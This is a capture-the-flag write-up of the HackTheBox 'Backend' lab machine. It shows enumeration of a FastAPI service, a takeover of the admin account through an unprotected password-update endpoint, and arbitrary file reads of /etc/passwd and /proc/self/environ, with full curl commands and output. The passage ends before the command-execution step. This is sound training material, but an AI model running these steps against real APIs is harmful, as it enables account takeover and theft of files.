---
title: HackTheBox - Backend
date: 2022-08-15 21:00:00 +0800
categories: [HackTheBox]
tags: [api]
img_path: /assets/img/machine/backend/
---

Backend is a machine that focuses on exploiting an `API`, the goal is to enumerate to find the swagger documentation, then gain access as admin to later modify the token to activate a debug flag to be able to call an endpoint that allows us to execute commands. Through this endpoint we obtain a shell to later escalate to root. The escalation is simple, in one of the access logs we can see the password of the root user which seems to be that he put unintentionally instead of the user name.

## Info

![Backend Machine Info](backend-machine-card.png)

## Port Scan

> script scanning (`-sC`), version scanning (`-sV`), output all formats (`-oA`)
{: .prompt-info }

```bash
$ nmap -sC -sV -oA nmap/backend 10.129.227.148
Nmap scan report for 10.129.227.148
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Tue, 16 Aug 2022 00:26:46 GMT
|     server: uvicorn
|     content-length: 29
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC API Version 1.0"}
|   HTTPOptions: 
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno }

We can see that you have two ports open, running `ssh` and `http`. We can also see that the http port is running using `uvicorn`
so we can assume that the backend of the application is made with Python.

> Uvicorn is an ASGI web server implementation for Python.
{: .prompt-info }

## Recon

Knowing that it is a web application the first thing we are going to do is to run `gobuster` to see what is the first thing we come across.

```bash
$ gobuster dir -u http://10.129.227.148/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt                   
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.227.148/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
[...] Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 401) [Size: 30]
/api                  (Status: 200) [Size: 20]
Progress: 1236 / 220561 (0.56%)
===============================================================
[...] Finished
===============================================================
```
{: .nolineno }

```bash
$ curl http://10.129.227.148/docs
{"detail":"Not authenticated"}

$ curl http://10.129.227.148/api 
{"endpoints":["v1"]}

$ curl http://10.129.227.148/api/v1
{"endpoints":["user","admin"]}

$ curl http://10.129.227.148/api/v1/user/   
{"detail":"Not Found"}

$ curl http://10.129.227.148/api/v1/admin/
{"detail":"Not authenticated"}
```
{: .nolineno }

### Directory Brute Force

We can see that for the admin endpoint we need authentication, but the user endpoint simply says not found. Let's launch `feroxbuster` to see if it is possible to enumerate within these endpoints.

> ignore status codes (`-C`), ignore response size (`-S`), methods (`-m`)
{: .prompt-info }

```bash
$ feroxbuster -u http://10.129.227.148/api/v1/user -C 404,405 -m GET,POST -S 4,104

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.227.148/api/v1/user
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 [...]
──────────────────────────────────────────────────
200      GET        1l        1w      141c http://10.129.227.148/api/v1/user/1
422     POST        1l        3w      172c http://10.129.227.148/api/v1/user/login
422     POST        1l        2w       81c http://10.129.227.148/api/v1/user/signup
```
{: .nolineno }

```bash
$ feroxbuster -u http://10.129.227.148/api/v1/admin -C 404,405 -m GET,POST -S 4,104

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.227.148/api/v1/admin
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 [...]
───────────────────────────┴──────────────────────
401     POST        1l        2w       30c http://10.129.227.148/api/v1/admin/file
```
{: .nolineno }

### Create and login with new user

Oh, we found some interesting endpoints, let's see what `/user/1` has.

```bash
$ curl -s http://10.129.227.148/api/v1/user/1 | jq
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}
```
{: .nolineno }

If we remember the endpoints we saw before, `/docs` responded indicating that we needed authentication, maybe we can register a new user through the `/signup` endpoint and then call docs with the `JWT` it returns.

```bash
$ curl -v -s -X POST -d '{"email": "v3he@htb.htb", "password": "batman"}' http://10.129.227.148/api/v1/user/signup -H "Content-Type: application/json"
*   Trying 10.129.227.148:80...
* Connected to 10.129.227.148 (10.129.227.148) port 80 (#0)
> POST /api/v1/user/signup HTTP/1.1
> Host: 10.129.227.148
> User-Agent: curl/7.84.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 47
> 
} [47 bytes data]
* Mark bundle as not supporting multiuse
< HTTP/1.1 201 Created
< date: Fri, 19 Aug 2022 14:57:25 GMT
< server: uvicorn
< content-length: 2
< content-type: application/json
< 
{ [2 bytes data]
* Connection #0 to host 10.129.227.148 left intact
```
{: .nolineno }

It seems to have been created successfully, let's login with the new user. 

```bash
$ curl -s -d 'username=v3he@htb.htb&password=batman' http://10.129.227.148/api/v1/user/login | jq             
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjEyMzg4LCJpYXQiOjE2NjA5MjExODgsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiYTBlMmYyMTgtZDgzOS00NzAxLWJmZmEtNmZkMWE5YzE2Njc3In0.eP1CO1e-2Z_vIfq1eMWQPr36G3ZfCSFguwxxMp2-Pro",
  "token_type": "bearer"
}
```
{: .nolineno }

### Reading Swagger Docs

```bash
$ curl -s 'http://10.129.227.148/docs' -H 'Authorization: Bearer [token]'

<!DOCTYPE html>
<html>
<head>
<link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui.css">
<link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
<title>docs</title>
</head>
<body>
<div id="swagger-ui">
</div>
<script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@3/swagger-ui-bundle.js"></script>
<!-- `SwaggerUIBundle` is now available on the page -->
<script>
  const ui = SwaggerUIBundle({
      url: '/openapi.json',
      "dom_id": "#swagger-ui",
      "layout": "BaseLayout",
      "deepLinking": true,
      "showExtensions": true,
      "showCommonExtensions": true,
      presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
      ],
  })
</script>
</body>
</html>
```
{: .nolineno }

docs points to `/openapi.json`, let's see what this endpoint contains.

```bash
$ curl -s 'http://10.129.227.148/openapi.json' -H 'Authorization: Bearer [token]' | jq
{
  "openapi": "3.0.2",
  "info": {
    "title": "FastAPI",
    "version": "0.1.0"
  },
  "paths": {
    "/": {
    "/api": {
    "/api/v1": {
    "/docs": {
    "/openapi.json": {
    "/api/v1/user/{user_id}": {
    "/api/v1/user/login": {
    "/api/v1/user/signup": {
    "/api/v1/user/SecretFlagEndpoint": {
    "/api/v1/user/updatepass": {
    "/api/v1/admin/": {
    "/api/v1/admin/file": {
    "/api/v1/admin/exec/{command}": {
  }
  [...]
}
```
{: .nolineno }

A complete list of endpoints! As we can imagine `/SecretFlagEndpoint` returns the flag of the user. This other endpoint `/updatepass` also catches our attention, but let's write it down for later, let's first take a look at `/admin/file` and `/admin/exec/{command}`.

```bash
$ curl -s 'http://10.129.227.148/api/v1/admin/file'        
{"detail":"Method Not Allowed"}

$ curl -s -X POST 'http://10.129.227.148/api/v1/admin/file' 
{"detail":"Not authenticated"}

$ curl -s -X POST 'http://10.129.227.148/api/v1/admin/file' -H 'Authorization: Bearer [token]'
{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}

$ curl -s -X POST 'http://10.129.227.148/api/v1/admin/file' -H 'Authorization: Bearer [token]' -d '{"file": "/etc/passwd"}'
{"msg":"Permission Error"}
```
{: .nolineno }

```bash
$ curl -s 'http://10.129.227.148/api/v1/admin/exec/whoami' 
{"detail":"Not authenticated"}

$ curl -s 'http://10.129.227.148/api/v1/admin/exec/whoami' -H 'Authorization: Bearer [token]'
{"detail":"Debug key missing from JWT"}
```
{: .nolineno }

At the moment we can't do anything with these endpoints, it's time to go back and look at `/updatepass`, it seems that as the name suggests, we can change the user's password.

```bash
$ curl -s 'http://10.129.227.148/api/v1/user/updatepass' -H "Content-Type: application/json" -d '{}'                                                                    
{"detail":[{"loc":["body","guid"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
```
{: .nolineno }

It seems that it needs two parameters, the `guid` and the new password, maybe we can use the guid that we saw before for the admin user and we can set a new password for this one.

```bash
$ curl -s 'http://10.129.227.148/api/v1/user/updatepass' -H "Content-Type: application/json" -d '{"guid": "36c2e94a-4271-4259-93bf-c96ad5948284", "password": "batman"}' | jq
{
  "date": null,
  "id": 1,
  "is_superuser": true,
  "hashed_password": "$2b$12$g4ZkjF9kiBGACLe5Eyyy4O73rgcsvGjsxYeOFkd9JXPeNqyanoYO2",
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "time_created": 1649533388111,
  "last_update": null
}
```
{: .nolineno }

Perfect! we have changed the password of the admin user, now we can login and test again the `/admin/file` endpoint.

```bash
$ curl -s -d 'username=admin@htb.local&password=batman' http://10.129.227.148/api/v1/user/login | jq
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYxNjE0OTAzLCJpYXQiOjE2NjA5MjM3MDMsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.NqpPycpaue3gKJjH8GgqRgUhonUvHKfmhNzP8L73SJ0",
  "token_type": "bearer"
}

$ curl -s 'http://10.129.227.148/api/v1/admin/file' -H 'Authorization: Bearer [token]' -H 'Content-Type: application/json' -d '{"file": "/etc/passwd"}' | jq      
{
  "file": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n"
}
```
{: .nolineno }

Great, now we can read files from the system, the next thing is to focus on the `/admin/exec/{command}` endpoint that will allow us to execute commands, but as we saw earlier, this command expects a debug variable in the `JWT`, but in order to modify it we need to know what is the key with which it has been signed. Luckily for us, we can now read files from the system and we know that it is an application made with python. Let's see if we can find some information to help us.

```bash
$ curl -s 'http://10.129.227.148/api/v1/admin/file' -H 'Authorization: Bearer [token]' -H 'Content-Type: application/json' -d '{"file": "/proc/self/environ"}' | jq      
{
  "file": "APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=76f234061dc84156b0a06eda15a9019f\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:18517\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"
}
```
{: .nolineno }

When displaying the environment variables, two interesting variables are displayed `APP_MODULE=app.main:app` and `PWD=/home/htb/uhc`.

